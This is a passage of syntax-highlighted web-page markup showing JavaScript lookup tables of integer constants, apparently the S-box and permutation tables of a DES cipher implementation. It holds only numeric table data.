class="number">268435456</span>: <span class="number">32768</span>,</span><br><span class="line">        <span class="number">536870912</span>: <span class="number">8421378</span>,</span><br><span class="line">        <span class="number">805306368</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="number">1073741824</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="number">1342177280</span>: <span class="number">8421890</span>,</span><br><span class="line">        <span class="number">1610612736</span>: <span class="number">8389122</span>,</span><br><span class="line">        <span class="number">1879048192</span>: <span class="number">8388608</span>,</span><br><span class="line">        <span class="number">2147483648</span>: <span class="number">514</span>,</span><br><span class="line">        <span class="number">2415919104</span>: <span class="number">8389120</span>,</span><br><span class="line">        <span class="number">2684354560</span>: <span class="number">33280</span>,</span><br><span class="line">        <span class="number">2952790016</span>: <span class="number">8421376</span>,</span><br><span class="line">        <span class="number">3221225472</span>: <span class="number">32770</span>,</span><br><span class="line">        <span class="number">3489660928</span>: <span class="number">8388610</span>,</span><br><span class="line">        <span class="number">3758096384</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">4026531840</span>: <span class="number">33282</span>,</span><br><span class="line">        <span class="number">134217728</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">402653184</span>: <span class="number">8421890</span>,</span><br><span class="line">        <span class="number">671088640</span>: <span class="number">33282</span>,</span><br><span class="line">        <span class="number">939524096</span>: <span class="number">32768</span>,</span><br><span class="line">        <span class="number">1207959552</span>: <span class="number">8421888</span>,</span><br><span class="line">        <span class="number">1476395008</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="number">1744830464</span>: <span class="number">8421378</span>,</span><br><span class="line">        <span class="number">2013265920</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="number">2281701376</span>: <span class="number">8389120</span>,</span><br><span class="line">        <span class="number">2550136832</span>: <span class="number">33280</span>,</span><br><span class="line">        <span class="number">2818572288</span>: <span class="number">8421376</span>,</span><br><span class="line">        <span class="number">3087007744</span>: <span class="number">8389122</span>,</span><br><span class="line">        <span class="number">3355443200</span>: <span class="number">8388610</span>,</span><br><span class="line">        <span class="number">3623878656</span>: <span class="number">32770</span>,</span><br><span class="line">        <span class="number">3892314112</span>: <span class="number">514</span>,</span><br><span class="line">        <span class="number">4160749568</span>: <span class="number">8388608</span>,</span><br><span class="line">        <span class="number">1</span>: <span class="number">32768</span>,</span><br><span class="line">        <span class="number">268435457</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="number">536870913</span>: <span class="number">8421888</span>,</span><br><span class="line">        <span class="number">805306369</span>: <span class="number">8388608</span>,</span><br><span class="line">        <span class="number">1073741825</span>: <span class="number">8421378</span>,</span><br><span class="line">        <span class="number">1342177281</span>: <span class="number">33280</span>,</span><br><span class="line">        <span class="number">1610612737</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="number">1879048193</span>: <span class="number">8389122</span>,</span><br><span class="line">        <span class="number">2147483649</span>: <span class="number">8421890</span>,</span><br><span class="line">        <span class="number">2415919105</span>: <span class="number">8421376</span>,</span><br><span class="line">        <span class="number">2684354561</span>: <span class="number">8388610</span>,</span><br><span class="line">        <span class="number">2952790017</span>: <span class="number">33282</span>,</span><br><span class="line">        <span class="number">3221225473</span>: <span class="number">514</span>,</span><br><span class="line">        <span class="number">3489660929</span>: <span class="number">8389120</span>,</span><br><span class="line">        <span class="number">3758096385</span>: <span class="number">32770</span>,</span><br><span class="line">        <span class="number">4026531841</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">134217729</span>: <span class="number">8421890</span>,</span><br><span class="line">        <span class="number">402653185</span>: <span class="number">8421376</span>,</span><br><span class="line">        <span class="number">671088641</span>: <span class="number">8388608</span>,</span><br><span class="line">        <span class="number">939524097</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="number">1207959553</span>: <span class="number">32768</span>,</span><br><span class="line">        <span class="number">1476395009</span>: <span class="number">8388610</span>,</span><br><span class="line">        <span class="number">1744830465</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="number">2013265921</span>: <span class="number">33282</span>,</span><br><span class="line">        <span class="number">2281701377</span>: <span class="number">32770</span>,</span><br><span class="line">        <span class="number">2550136833</span>: <span class="number">8389122</span>,</span><br><span class="line">        <span class="number">2818572289</span>: <span class="number">514</span>,</span><br><span class="line">        <span class="number">3087007745</span>: <span class="number">8421888</span>,</span><br><span class="line">        <span class="number">3355443201</span>: <span class="number">8389120</span>,</span><br><span class="line">        <span class="number">3623878657</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">3892314113</span>: <span class="number">33280</span>,</span><br><span class="line">        <span class="number">4160749569</span>: <span class="number">8421378</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">1074282512</span>,</span><br><span class="line">        <span class="number">16777216</span>: <span class="number">16384</span>,</span><br><span class="line">        <span class="number">33554432</span>: <span class="number">524288</span>,</span><br><span class="line">        <span class="number">50331648</span>: <span class="number">1074266128</span>,</span><br><span class="line">        <span class="number">67108864</span>: <span class="number">1073741840</span>,</span><br><span class="line">        <span class="number">83886080</span>: <span class="number">1074282496</span>,</span><br><span class="line">        <span class="number">100663296</span>: <span class="number">1073758208</span>,</span><br><span class="line">        <span class="number">117440512</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="number">134217728</span>: <span class="number">540672</span>,</span><br><span class="line">        <span class="number">150994944</span>: <span class="number">1073758224</span>,</span><br><span class="line">        <span class="number">167772160</span>: <span class="number">1073741824</span>,</span><br><span class="line">        <span class="number">184549376</span>: <span class="number">540688</span>,</span><br><span class="line">        <span class="number">201326592</span>: <span class="number">524304</span>,</span><br><span class="line">        <span class="number">218103808</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">234881024</span>: <span class="number">16400</span>,</span><br><span class="line">        <span class="number">251658240</span>: <span class="number">1074266112</span>,</span><br><span class="line">        <span class="number">8388608</span>: <span class="number">1073758208</span>,</span><br><span class="line">        <span class="number">25165824</span>: <span class="number">540688</span>,</span><br><span class="line">        <span class="number">41943040</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="number">58720256</span>: <span class="number">1073758224</span>,</span><br><span class="line">        <span class="number">75497472</span>: <span class="number">1074282512</span>,</span><br><span class="line">        <span class="number">92274688</span>: <span class="number">1073741824</span>,</span><br><span class="line">        <span class="number">109051904</span>: <span class="number">524288</span>,</span><br><span class="line">        <span class="number">125829120</span>: <span class="number">1074266128</span>,</span><br><span class="line">        <span class="number">142606336</span>: <span class="number">524304</span>,</span><br><span class="line">        <span class="number">159383552</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">176160768</span>: <span class="number">16384</span>,</span><br><span class="line">        <span class="number">192937984</span>: <span class="number">1074266112</span>,</span><br><span class="line">        <span class="number">209715200</span>: <span class="number">1073741840</span>,</span><br><span class="line">        <span class="number">226492416</span>: <span class="number">540672</span>,</span><br><span class="line">        <span class="number">243269632</span>: <span class="number">1074282496</span>,</span><br><span class="line">        <span class="number">260046848</span>: <span class="number">16400</span>,</span><br><span class="line">        <span class="number">268435456</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">285212672</span>: <span class="number">1074266128</span>,</span><br><span class="line">        <span class="number">301989888</span>: <span class="number">1073758224</span>,</span><br><span class="line">        <span class="number">318767104</span>: <span class="number">1074282496</span>,</span><br><span class="line">        <span class="number">335544320</span>: <span class="number">1074266112</span>,</span><br><span class="line">        <span class="number">352321536</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="number">369098752</span>: <span class="number">540688</span>,</span><br><span class="line">        <span class="number">385875968</span>: <span class="number">16384</span>,</span><br><span class="line">        <span class="number">402653184</span>: <span class="number">16400</span>,</span><br><span class="line">        <span class="number">419430400</span>: <span class="number">524288</span>,</span><br><span class="line">        <span class="number">436207616</span>: <span class="number">524304</span>,</span><br><span class="line">        <span class="number">452984832</span>: <span class="number">1073741840</span>,</span><br><span class="line">        <span class="number">469762048</span>: <span class="number">540672</span>,</span><br><span class="line">        <span class="number">486539264</span>: <span class="number">1073758208</span>,</span><br><span class="line">        <span class="number">503316480</span>: <span class="number">1073741824</span>,</span><br><span class="line">        <span class="number">520093696</span>: <span class="number">1074282512</span>,</span><br><span class="line">        <span class="number">276824064</span>: <span class="number">540688</span>,</span><br><span class="line">        <span class="number">293601280</span>: <span class="number">524288</span>,</span><br><span class="line">        <span class="number">310378496</span>: <span class="number">1074266112</span>,</span><br><span class="line">        <span class="number">327155712</span>: <span class="number">16384</span>,</span><br><span class="line">        <span class="number">343932928</span>: <span class="number">1073758208</span>,</span><br><span class="line">        <span class="number">360710144</span>: <span class="number">1074282512</span>,</span><br><span class="line">        <span class="number">377487360</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="number">394264576</span>: <span class="number">1073741824</span>,</span><br><span class="line">        <span class="number">411041792</span>: <span class="number">1074282496</span>,</span><br><span class="line">        <span class="number">427819008</span>: <span class="number">1073741840</span>,</span><br><span class="line">        <span class="number">444596224</span>: <span class="number">1073758224</span>,</span><br><span class="line">        <span class="number">461373440</span>: <span class="number">524304</span>,</span><br><span class="line">        <span class="number">478150656</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">494927872</span>: <span class="number">16400</span>,</span><br><span class="line">        <span class="number">511705088</span>: <span class="number">1074266128</span>,</span><br><span class="line">        <span class="number">528482304</span>: <span class="number">540672</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">260</span>,</span><br><span class="line">        <span class="number">1048576</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">2097152</span>: <span class="number">67109120</span>,</span><br><span class="line">        <span class="number">3145728</span>: <span class="number">65796</span>,</span><br><span class="line">        <span class="number">4194304</span>: <span class="number">65540</span>,</span><br><span class="line">        <span class="number">5242880</span>: <span class="number">67108868</span>,</span><br><span class="line">        <span class="number">6291456</span>: <span class="number">67174660</span>,</span><br><span class="line">        <span class="number">7340032</span>: <span class="number">67174400</span>,</span><br><span class="line">        <span class="number">8388608</span>: <span class="number">67108864</span>,</span><br><span class="line">        <span class="number">9437184</span>: <span class="number">67174656</span>,</span><br><span class="line">        <span class="number">10485760</span>: <span class="number">65792</span>,</span><br><span class="line">        <span class="number">11534336</span>: <span class="number">67174404</span>,</span><br><span class="line">        <span class="number">12582912</span>: <span class="number">67109124</span>,</span><br><span class="line">        <span class="number">13631488</span>: <span class="number">65536</span>,</span><br><span class="line">        <span class="number">14680064</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="number">15728640</span>: <span class="number">256</span>,</span><br><span class="line">        <span class="number">524288</span>: <span class="number">67174656</span>,</span><br><span class="line">        <span class="number">1572864</span>: <span class="number">67174404</span>,</span><br><span class="line">        <span class="number">2621440</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">3670016</span>: <span class="number">67109120</span>,</span><br><span class="line">        <span class="number">4718592</span>: <span class="number">67108868</span>,</span><br><span class="line">        <span class="number">5767168</span>: <span class="number">65536</span>,</span><br><span class="line">        <span class="number">6815744</span>: <span class="number">65540</span>,</span><br><span class="line">        <span class="number">7864320</span>: <span class="number">260</span>,</span><br><span class="line">        <span class="number">8912896</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="number">9961472</span>: <span class="number">256</span>,</span><br><span class="line">        <span class="number">11010048</span>: <span class="number">67174400</span>,</span><br><span class="line">        <span class="number">12058624</span>: <span class="number">65796</span>,</span><br><span class="line">        <span class="number">13107200</span>: <span class="number">65792</span>,</span><br><span class="line">        <span class="number">14155776</span>: <span class="number">67109124</span>,</span><br><span class="line">        <span class="number">15204352</span>: <span class="number">67174660</span>,</span><br><span class="line">        <span class="number">16252928</span>: <span class="number">67108864</span>,</span><br><span class="line">        <span class="number">16777216</span>: <span class="number">67174656</span>,</span><br><span class="line">        <span class="number">17825792</span>: <span class="number">65540</span>,</span><br><span class="line">        <span class="number">18874368</span>: <span class="number">65536</span>,</span><br><span class="line">        <span class="number">19922944</span>: <span class="number">67109120</span>,</span><br><span class="line">        <span class="number">20971520</span>: <span class="number">256</span>,</span><br><span class="line">        <span class="number">22020096</span>: <span class="number">67174660</span>,</span><br><span class="line">        <span class="number">23068672</span>: <span class="number">67108868</span>,</span><br><span class="line">        <span class="number">24117248</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">25165824</span>: <span class="number">67109124</span>,</span><br><span class="line">        <span class="number">26214400</span>: <span class="number">67108864</span>,</span><br><span class="line">        <span class="number">27262976</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="number">28311552</span>: <span class="number">65792</span>,</span><br><span class="line">        <span class="number">29360128</span>: <span class="number">67174400</span>,</span><br><span class="line">        <span class="number">30408704</span>: <span class="number">260</span>,</span><br><span class="line">        <span class="number">31457280</span>: <span class="number">65796</span>,</span><br><span class="line">        <span class="number">32505856</span>: <span class="number">67174404</span>,</span><br><span class="line">        <span class="number">17301504</span>: <span class="number">67108864</span>,</span><br><span class="line">        <span class="number">18350080</span>: <span class="number">260</span>,</span><br><span class="line">        <span class="number">19398656</span>: <span class="number">67174656</span>,</span><br><span class="line">        <span class="number">20447232</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">21495808</span>: <span class="number">65540</span>,</span><br><span class="line">        <span class="number">22544384</span>: <span class="number">67109120</span>,</span><br><span class="line">        <span class="number">23592960</span>: <span class="number">256</span>,</span><br><span class="line">        <span class="number">24641536</span>: <span class="number">67174404</span>,</span><br><span class="line">        <span class="number">25690112</span>: <span class="number">65536</span>,</span><br><span class="line">        <span class="number">26738688</span>: <span class="number">67174660</span>,</span><br><span class="line">        <span class="number">27787264</span>: <span class="number">65796</span>,</span><br><span class="line">        <span class="number">28835840</span>: <span class="number">67108868</span>,</span><br><span class="line">        <span class="number">29884416</span>: <span class="number">67109124</span>,</span><br><span class="line">        <span class="number">30932992</span>: <span class="number">67174400</span>,</span><br><span class="line">        <span class="number">31981568</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="number">33030144</span>: <span class="number">65792</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">2151682048</span>,</span><br><span class="line">        <span class="number">65536</span>: <span class="number">2147487808</span>,</span><br><span class="line">        <span class="number">131072</span>: <span class="number">4198464</span>,</span><br><span class="line">        <span class="number">196608</span>: <span class="number">2151677952</span>,</span><br><span class="line">        <span class="number">262144</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">327680</span>: <span class="number">4198400</span>,</span><br><span class="line">        <span class="number">393216</span>: <span class="number">2147483712</span>,</span><br><span class="line">        <span class="number">458752</span>: <span class="number">4194368</span>,</span><br><span class="line">        <span class="number">524288</span>: <span class="number">2147483648</span>,</span><br><span class="line">        <span class="number">589824</span>: <span class="number">4194304</span>,</span><br><span class="line">        <span class="number">655360</span>: <span class="number">64</span>,</span><br><span class="line">        <span class="number">720896</span>: <span class="number">2147487744</span>,</span><br><span class="line">        <span class="number">786432</span>: <span class="number">2151678016</span>,</span><br><span class="line">        <span class="number">851968</span>: <span class="number">4160</span>,</span><br><span class="line">        <span class="number">917504</span>: <span class="number">4096</span>,</span><br><span class="line">        <span class="number">983040</span>: <span class="number">2151682112</span>,</span><br><span class="line">        <span class="number">32768</span>: <span class="number">2147487808</span>,</span><br><span class="line">        <span class="number">98304</span>: <span class="number">64</span>,</span><br><span class="line">        <span class="number">163840</span>: <span class="number">2151678016</span>,</span><br><span class="line">        <span class="number">229376</span>: <span class="number">2147487744</span>,</span><br><span class="line">        <span class="number">294912</span>: <span class="number">4198400</span>,</span><br><span class="line">        <span class="number">360448</span>: <span class="number">2151682112</span>,</span><br><span class="line">        <span class="number">425984</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">491520</span>: <span class="number">2151677952</span>,</span><br><span class="line">        <span class="number">557056</span>: <span class="number">4096</span>,</span><br><span class="line">        <span class="number">622592</span>: <span class="number">2151682048</span>,</span><br><span class="line">        <span class="number">688128</span>: <span class="number">4194304</span>,</span><br><span class="line">        <span class="number">753664</span>: <span class="number">4160</span>,</span><br><span class="line">        <span class="number">819200</span>: <span class="number">2147483648</span>,</span><br><span class="line">        <span class="number">884736</span>: <span class="number">4194368</span>,</span><br><span class="line">        <span class="number">950272</span>: <span class="number">4198464</span>,</span><br><span class="line">        <span class="number">1015808</span>: <span class="number">2147483712</span>,</span><br><span class="line">        <span class="number">1048576</span>: <span class="number">4194368</span>,</span><br><span class="line">        <span class="number">1114112</span>: <span class="number">4198400</span>,</span><br><span class="line">        <span class="number">1179648</span>: <span class="number">2147483712</span>,</span><br><span class="line">        <span class="number">1245184</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">1310720</span>: <span class="number">4160</span>,</span><br><span class="line">        <span class="number">1376256</span>: <span class="number">2151678016</span>,</span><br><span class="line">        <span class="number">1441792</span>: <span class="number">2151682048</span>,</span><br><span class="line">        <span class="number">1507328</span>: <span class="number">2147487808</span>,</span><br><span class="line">        <span class="number">1572864</span>: <span class="number">2151682112</span>,</span><br><span class="line">        <span class="number">1638400</span>: <span class="number">2147483648</span>,</span><br><span class="line">        <span class="number">1703936</span>: <span class="number">2151677952</span>,</span><br><span class="line">        <span class="number">1769472</span>: <span class="number">4198464</span>,</span><br><span class="line">        <span class="number">1835008</span>: <span class="number">2147487744</span>,</span><br><span class="line">        <span class="number">1900544</span>: <span class="number">4194304</span>,</span><br><span class="line">        <span class="number">1966080</span>: <span class="number">64</span>,</span><br><span class="line">        <span class="number">2031616</span>: <span class="number">4096</span>,</span><br><span class="line">        <span class="number">1081344</span>: <span class="number">2151677952</span>,</span><br><span class="line">        <span class="number">1146880</span>: <span class="number">2151682112</span>,</span><br><span class="line">        <span class="number">1212416</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">1277952</span>: <span class="number">4198400</span>,</span><br><span class="line">        <span class="number">1343488</span>: <span class="number">4194368</span>,</span><br><span class="line">        <span class="number">1409024</span>: <span class="number">2147483648</span>,</span><br><span class="line">        <span class="number">1474560</span>: <span class="number">2147487808</span>,</span><br><span class="line">        <span class="number">1540096</span>: <span class="number">64</span>,</span><br><span class="line">        <span class="number">1605632</span>: <span class="number">2147483712</span>,</span><br><span class="line">        <span class="number">1671168</span>: <span class="number">4096</span>,</span><br><span class="line">        <span class="number">1736704</span>: <span class="number">2147487744</span>,</span><br><span class="line">        <span class="number">1802240</span>: <span class="number">2151678016</span>,</span><br><span class="line">        <span class="number">1867776</span>: <span class="number">4160</span>,</span><br><span class="line">        <span class="number">1933312</span>: <span class="number">2151682048</span>,</span><br><span class="line">        <span class="number">1998848</span>: <span class="number">4194304</span>,</span><br><span class="line">        <span class="number">2064384</span>: <span class="number">4198464</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">128</span>,</span><br><span class="line">        <span class="number">4096</span>: <span class="number">17039360</span>,</span><br><span class="line">        <span class="number">8192</span>: <span class="number">262144</span>,</span><br><span class="line">        <span class="number">12288</span>: <span class="number">536870912</span>,</span><br><span class="line">        <span class="number">16384</span>: <span class="number">537133184</span>,</span><br><span class="line">        <span class="number">20480</span>: <span class="number">16777344</span>,</span><br><span class="line">        <span class="number">24576</span>: <span class="number">553648256</span>,</span><br><span class="line">        <span class="number">28672</span>: <span class="number">262272</span>,</span><br><span class="line">        <span class="number">32768</span>: <span class="number">16777216</span>,</span><br><span class="line">        <span class="number">36864</span>: <span class="number">537133056</span>,</span><br><span class="line">        <span class="number">40960</span>: <span class="number">536871040</span>,</span><br><span class="line">        <span class="number">45056</span>: <span class="number">553910400</span>,</span><br><span class="line">        <span class="number">49152</span>: <span class="number">553910272</span>,</span><br><span class="line">        <span class="number">53248</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">57344</span>: <span class="number">17039488</span>,</span><br><span class="line">        <span class="number">61440</span>: <span class="number">553648128</span>,</span><br><span class="line">        <span class="number">2048</span>: <span class="number">17039488</span>,</span><br><span class="line">        <span class="number">6144</span>: <span class="number">553648256</span>,</span><br><span class="line">        <span class="number">10240</span>: <span class="number">128</span>,</span><br><span class="line">        <span class="number">14336</span>: <span class="number">17039360</span>,</span><br><span class="line">        <span class="number">18432</span>: <span class="number">262144</span>,</span><br><span class="line">        <span class="number">22528</span>: <span class="number">537133184</span>,</span><br><span class="line">        <span class="number">26624</span>: <span class="number">553910272</span>,</span><br><span class="line">        <span class="number">30720</span>: <span class="number">536870912</span>,</span><br><span class="line">        <span class="number">34816</span>: <span class="number">537133056</span>,</span><br><span class="line">        <span class="number">38912</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">43008</span>: <span class="number">553910400</span>,</span><br><span class="line">        <span class="number">47104</span>: <span class="number">16777344</span>,</span><br><span class="line">        <span class="number">51200</span>: <span class="number">536871040</span>,</span><br><span class="line">        <span class="number">55296</span>: <span class="number">553648128</span>,</span><br><span class="line">        <span class="number">59392</span>: <span class="number">16777216</span>,</span><br><span class="line">        <span class="number">63488</span>: <span class="number">262272</span>,</span><br><span class="line">        <span class="number">65536</span>: <span class="number">262144</span>,</span><br><span class="line">        <span class="number">69632</span>: <span class="number">128</span>,</span><br><span class="line">        <span class="number">73728</span>: <span class="number">536870912</span>,</span><br><span class="line">        <span class="number">77824</span>: <span class="number">553648256</span>,</span><br><span class="line">        <span class="number">81920</span>: <span class="number">16777344</span>,</span><br><span class="line">        <span class="number">86016</span>: <span class="number">553910272</span>,</span><br><span class="line">        <span class="number">90112</span>: <span class="number">537133184</span>,</span><br><span class="line">        <span class="number">94208</span>: <span class="number">16777216</span>,</span><br><span class="line">        <span class="number">98304</span>: <span class="number">553910400</span>,</span><br><span class="line">        <span class="number">102400</span>: <span class="number">553648128</span>,</span><br><span class="line">        <span class="number">106496</span>: <span class="number">17039360</span>,</span><br><span class="line">        <span class="number">110592</span>: <span class="number">537133056</span>,</span><br><span class="line">        <span class="number">114688</span>: <span class="number">262272</span>,</span><br><span class="line">        <span class="number">118784</span>: <span class="number">536871040</span>,</span><br><span class="line">        <span class="number">122880</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">126976</span>: <span class="number">17039488</span>,</span><br><span class="line">        <span class="number">67584</span>: <span class="number">553648256</span>,</span><br><span class="line">        <span class="number">71680</span>: <span class="number">16777216</span>,</span><br><span class="line">        <span class="number">75776</span>: <span class="number">17039360</span>,</span><br><span class="line">        <span class="number">79872</span>: <span class="number">537133184</span>,</span><br><span class="line">        <span class="number">83968</span>: <span class="number">536870912</span>,</span><br><span class="line">        <span class="number">88064</span>: <span class="number">17039488</span>,</span><br><span class="line">        <span class="number">92160</span>: <span class="number">128</span>,</span><br><span class="line">        <span class="number">96256</span>: <span class="number">553910272</span>,</span><br><span class="line">        <span class="number">100352</span>: <span class="number">262272</span>,</span><br><span class="line">        <span class="number">104448</span>: <span class="number">553910400</span>,</span><br><span class="line">        <span class="number">108544</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">112640</span>: <span class="number">553648128</span>,</span><br><span class="line">        <span class="number">116736</span>: <span class="number">16777344</span>,</span><br><span class="line">        <span class="number">120832</span>: <span class="number">262144</span>,</span><br><span class="line">        <span class="number">124928</span>: <span class="number">537133056</span>,</span><br><span class="line">        <span class="number">129024</span>: <span class="number">536871040</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">268435464</span>,</span><br><span class="line">        <span class="number">256</span>: <span class="number">8192</span>,</span><br><span class="line">        <span class="number">512</span>: <span class="number">270532608</span>,</span><br><span class="line">        <span class="number">768</span>: <span class="number">270540808</span>,</span><br><span class="line">        <span class="number">1024</span>: <span class="number">268443648</span>,</span><br><span class="line">        <span class="number">1280</span>: <span class="number">2097152</span>,</span><br><span class="line">        <span class="number">1536</span>: <span class="number">2097160</span>,</span><br><span class="line">        <span class="number">1792</span>: <span class="number">268435456</span>,</span><br><span class="line">        <span class="number">2048</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">2304</span>: <span class="number">268443656</span>,</span><br><span class="line">        <span class="number">2560</span>: <span class="number">2105344</span>,</span><br><span class="line">        <span class="number">2816</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="number">3072</span>: <span class="number">270532616</span>,</span><br><span class="line">        <span class="number">3328</span>: <span class="number">2105352</span>,</span><br><span class="line">        <span class="number">3584</span>: <span class="number">8200</span>,</span><br><span class="line">        <span class="number">3840</span>: <span class="number">270540800</span>,</span><br><span class="line">        <span class="number">128</span>: <span class="number">270532608</span>,</span><br><span class="line">        <span class="number">384</span>: <span class="number">270540808</span>,</span><br><span class="line">        <span class="number">640</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="number">896</span>: <span class="number">2097152</span>,</span><br><span class="line">        <span class="number">1152</span>: <span class="number">2105352</span>,</span><br><span class="line">        <span class="number">1408</span>: <span class="number">268435464</span>,</span><br><span class="line">        <span class="number">1664</span>: <span class="number">268443648</span>,</span><br><span class="line">        <span class="number">1920</span>: <span class="number">8200</span>,</span><br><span class="line">        <span class="number">2176</span>: <span class="number">2097160</span>,</span><br><span class="line">        <span class="number">2432</span>: <span class="number">8192</span>,</span><br><span class="line">        <span class="number">2688</span>: <span class="number">268443656</span>,</span><br><span class="line">        <span class="number">2944</span>: <span class="number">270532616</span>,</span><br><span class="line">        <span class="number">3200</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">3456</span>: <span class="number">270540800</span>,</span><br><span class="line">        <span class="number">3712</span>: <span class="number">2105344</span>,</span><br><span class="line">        <span class="number">3968</span>: <span class="number">268435456</span>,</span><br><span class="line">        <span class="number">4096</span>: <span class="number">268443648</span>,</span><br><span class="line">        <span class="number">4352</span>: <span class="number">270532616</span>,</span><br><span class="line">        <span class="number">4608</span>: <span class="number">270540808</span>,</span><br><span class="line">        <span class="number">4864</span>: <span class="number">8200</span>,</span><br><span class="line">        <span class="number">5120</span>: <span class="number">2097152</span>,</span><br><span class="line">        <span class="number">5376</span>: <span class="number">268435456</span>,</span><br><span class="line">        <span class="number">5632</span>: <span class="number">268435464</span>,</span><br><span class="line">        <span class="number">5888</span>: <span class="number">2105344</span>,</span><br><span class="line">        <span class="number">6144</span>: <span class="number">2105352</span>,</span><br><span class="line">        <span class="number">6400</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">6656</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="number">6912</span>: <span class="number">270532608</span>,</span><br><span class="line">        <span class="number">7168</span>: <span class="number">8192</span>,</span><br><span class="line">        <span class="number">7424</span>: <span class="number">268443656</span>,</span><br><span class="line">        <span class="number">7680</span>: <span class="number">270540800</span>,</span><br><span class="line">        <span class="number">7936</span>: <span class="number">2097160</span>,</span><br><span class="line">        <span class="number">4224</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="number">4480</span>: <span class="number">2105344</span>,</span><br><span class="line">        <span class="number">4736</span>: <span class="number">2097152</span>,</span><br><span class="line">        <span class="number">4992</span>: <span class="number">268435464</span>,</span><br><span class="line">        <span class="number">5248</span>: <span class="number">268443648</span>,</span><br><span class="line">        <span class="number">5504</span>: <span class="number">8200</span>,</span><br><span class="line">        <span class="number">5760</span>: <span class="number">270540808</span>,</span><br><span class="line">        <span class="number">6016</span>: <span class="number">270532608</span>,</span><br><span class="line">        <span class="number">6272</span>: <span class="number">270540800</span>,</span><br><span class="line">        <span class="number">6528</span>: <span class="number">270532616</span>,</span><br><span class="line">        <span class="number">6784</span>: <span class="number">8192</span>,</span><br><span class="line">        <span class="number">7040</span>: <span class="number">2105352</span>,</span><br><span class="line">        <span class="number">7296</span>: <span class="number">2097160</span>,</span><br><span class="line">        <span class="number">7552</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">7808</span>: <span class="number">268435456</span>,</span><br><span class="line">        <span class="number">8064</span>: <span class="number">268443656</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">1048576</span>,</span><br><span class="line">        <span class="number">16</span>: <span class="number">33555457</span>,</span><br><span class="line">        <span class="number">32</span>: <span class="number">1024</span>,</span><br><span class="line">        <span class="number">48</span>: <span class="number">1049601</span>,</span><br><span class="line">        <span class="number">64</span>: <span class="number">34604033</span>,</span><br><span class="line">        <span class="number">80</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">96</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">112</span>: <span class="number">34603009</span>,</span><br><span class="line">        <span class="number">128</span>: <span class="number">33555456</span>,</span><br><span class="line">        <span class="number">144</span>: <span class="number">1048577</span>,</span><br><span class="line">        <span class="number">160</span>: <span class="number">33554433</span>,</span><br><span class="line">        <span class="number">176</span>: <span class="number">34604032</span>,</span><br><span class="line">        <span class="number">192</span>: <span class="number">34603008</span>,</span><br><span class="line">        <span class="number">208</span>: <span class="number">1025</span>,</span><br><span class="line">        <span class="number">224</span>: <span class="number">1049600</span>,</span><br><span class="line">        <span class="number">240</span>: <span class="number">33554432</span>,</span><br><span class="line">        <span class="number">8</span>: <span class="number">34603009</span>,</span><br><span class="line">        <span class="number">24</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">40</span>: <span class="number">33555457</span>,</span><br><span class="line">        <span class="number">56</span>: <span class="number">34604032</span>,</span><br><span class="line">        <span class="number">72</span>: <span class="number">1048576</span>,</span><br><span class="line">        <span class="number">88</span>: <span class="number">33554433</span>,</span><br><span class="line">        <span class="number">104</span>: <span class="number">33554432</span>,</span><br><span class="line">        <span class="number">120</span>: <span class="number">1025</span>,</span><br><span class="line">        <span class="number">136</span>: <span class="number">1049601</span>,</span><br><span class="line">        <span class="number">152</span>: <span class="number">33555456</span>,</span><br><span class="line">        <span class="number">168</span>: <span class="number">34603008</span>,</span><br><span class="line">        <span class="number">184</span>: <span class="number">1048577</span>,</span><br><span class="line">        <span class="number">200</span>: <span 